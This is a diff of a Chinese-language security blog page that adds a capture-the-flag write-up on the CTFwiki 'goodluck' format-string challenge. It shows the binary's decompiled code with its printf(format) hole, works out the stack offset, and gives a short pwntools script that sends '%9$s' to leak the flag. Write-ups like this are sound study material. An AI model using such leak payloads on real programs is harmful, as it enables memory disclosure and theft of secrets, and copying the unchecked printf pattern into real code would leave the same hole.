@@ -78,6 +78,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-格式化字符串之CTFwiki-goodluck" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" class="article-date">
+  <time class="dt-published" datetime="2021-04-24T06:58:00.000Z" itemprop="datePublished">2021-04-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/">格式化字符串之CTFwiki-Goodluck</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="献上goodluck的伪代码"><a href="#献上goodluck的伪代码" class="headerlink" title="献上goodluck的伪代码"></a>献上goodluck的伪代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+3h] [rbp-3Dh]</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  char *format; // [rsp+8h] [rbp-38h]</span><br><span class="line">  _IO_FILE *fp; // [rsp+10h] [rbp-30h]</span><br><span class="line">  char *v9; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char v10[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 21; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  puts(<span class="string">&quot;what&#x27;s the flag&quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = 0LL;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ms&quot;</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = 0; j &lt;= 21; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      puts(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞点printf-format"><a href="#漏洞点printf-format" class="headerlink" title="漏洞点printf(format);"></a>漏洞点printf(format);</h4><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>我们先在本地创建一个flag.txt文件，以保证程序正常运行<br><img src="/2021/04/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/1.png" alt="1.png"><br>结合伪代码和 ./goodluck 我们发现：<br>程序用 IO_getc 把 flag.txt 读入栈中，然后让我们输入字符串，最后输出字符串。</p>
+<h2 id="献上脚本"><a href="#献上脚本" class="headerlink" title="献上脚本"></a>献上脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9<span class="variable">$s</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将断点断在printf(fmtstr)上，先后输入<br> r 和 step。发现printf栈帧周围存在已经入栈的flag.txt的内容。<br>发现偏移为4。<br>但是此程序为64位，加上6个寄存器，偏移为10<br>但是%9$s是不包括fmtstr本身的偏移，所以最终偏移为9<br>最后写出脚本，泄露flag.txt.</p>
+<h4 id="有关flag-txt入栈的细节可以自行研究"><a href="#有关flag-txt入栈的细节可以自行研究" class="headerlink" title="有关flag.txt入栈的细节可以自行研究"></a>有关flag.txt入栈的细节可以自行研究</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" data-id="cknvemjlo0000kcu6b6voccln" data-title="格式化字符串之CTFwiki-Goodluck" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-pwn学习谷歌关键词" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/" class="article-date">
@@ -292,6 +334,10 @@
       <ul>
         
           <li>
+            <a href="/2021/06/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%A0%86%E6%BA%A2%E5%87%BAUAF-time-formatter/">攻防世界堆溢出UAF_time_formatter</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/11/Unlink/">Unlink</a>
           </li>
         
@@ -305,10 +351,6 @@
         
           <li>
             <a href="/2021/05/03/UAF%E6%BC%8F%E6%B4%9E/">UAF漏洞初探</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/02/%E4%BA%BA%E6%B4%BB%E7%9D%80%E5%B0%B1%E6%98%AF%E4%B8%BA%E4%BA%86%E2%80%94%E2%80%94%E5%8C%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6/">人活着就是为了——北京邮电大学</a>
           </li>
         
       </ul>
